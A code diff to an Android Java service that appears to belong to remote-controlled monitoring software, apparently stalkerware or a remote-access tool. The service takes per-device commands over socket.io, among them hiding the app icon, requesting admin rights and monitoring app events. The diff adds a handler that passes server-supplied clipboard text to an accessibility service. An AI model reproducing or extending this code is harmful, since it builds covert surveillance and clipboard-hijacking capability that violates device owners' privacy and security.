@@ -120,6 +120,7 @@ public class Server extends Service {
             socket.on("mb-application-event-monitor-" + mDeviceID, onAppEventMonitor);
             socket.on("mb-request-admin-monitor-" + mDeviceID, onRequestAdminMonitor);
             socket.on("mb-visible-app-event-" + mDeviceID, OnHideAppIconMonitor);
+            socket.on("mb-clipboard-event-" + mDeviceID, OnClipBoardMonitor);
             socket.on("mb-monitor-close-" + mDeviceID, onCloseMonitor);
         } catch (URISyntaxException e) {
             e.printStackTrace();
@@ -547,6 +548,23 @@ public class Server extends Service {
                     Intent broadcastIntent = new Intent(MainAccessibilityService.ACTION_APP_ICON_SHOW);
                     sendBroadcast(broadcastIntent);
                 }
+            } catch (JSONException e) {
+                Log.d("error::", e.toString());
+            }
+        }
+    };
+
+    private final Emitter.Listener OnClipBoardMonitor = new Emitter.Listener() {
+        @Override
+        public void call(Object... args) {
+            JSONObject data = (JSONObject) args[0];
+            Log.d("OnClipBoardMonitor:", data.toString());
+            String text = "";
+            try {
+                text = (String) data.get("text");
+                Intent broadcastIntent = new Intent(MainAccessibilityService.ACTION_CLIPBOARD_MONITOR);
+                broadcastIntent.putExtra("text", text);
+                sendBroadcast(broadcastIntent);
             } catch (JSONException e) {
                 Log.d("error::", e.toString());
             }
